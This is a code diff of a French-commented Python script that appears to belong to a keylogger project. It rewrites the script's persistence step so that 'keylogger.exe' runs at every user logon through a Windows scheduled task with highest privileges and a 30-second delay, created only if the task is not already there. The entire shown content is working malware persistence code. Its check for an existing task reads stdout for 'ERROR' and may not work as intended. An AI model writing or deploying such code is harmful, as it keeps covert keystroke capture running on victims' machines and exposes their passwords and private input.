@@ -12,17 +12,31 @@ import os
 
 #--------DÉBUT TÂCHES PROGRAMMÉES---------------
 
-def tacheProgramme(tache,chemin):
-    command = f'schtasks /create /tn "{tache}" /tr "{chemin}" /sc onstart /f'
+# Définir le chemin de l'exécutable
+executable_path = os.path.join(os.getcwd(), 'keylogger.exe')
 
-    os.system(command)
-    print(f"Tâche '{tache}' programmée pour s'exécuter au démarrage du système.")
+# Définir les paramètres de la tâche planifiée
+task_name = "KeyloggerStartupTask"
+delay = 30  # Délai en secondes
 
-tache = "Keylogger"
-chemin = os.getcwd()
-chemin +="/keylogger.exe"
+# Commande pour créer une tâche planifiée qui exécute l'exécutable au démarrage avec temporisation
+task_command = (
+    f"schtasks /create /tn {task_name} /tr \"cmd /c timeout /t {delay} & {executable_path}\" "
+    f"/sc onlogon /rl highest /f"
+)
 
-tacheProgramme(tache,chemin)
+# Vérifier si la tâche existe déjà
+check_task = subprocess.run(['schtasks', '/query', '/tn', task_name], capture_output=True, text=True)
+
+# Ajouter la tâche planifiée si elle n'existe pas
+if "ERROR" in check_task.stdout:
+    result = subprocess.run(task_command, shell=True, capture_output=True, text=True)
+    if result.returncode == 0:
+        print(f"L'exécutable a été ajouté au démarrage avec le nom de tâche '{task_name}'.")
+    else:
+        print("Erreur lors de la création de la tâche :", result.stderr)
+else:
+    print("L'exécutable est déjà configuré pour démarrer automatiquement.")
 
 
 #--------FIN TÂCHES PROGRAMMÉES----------------
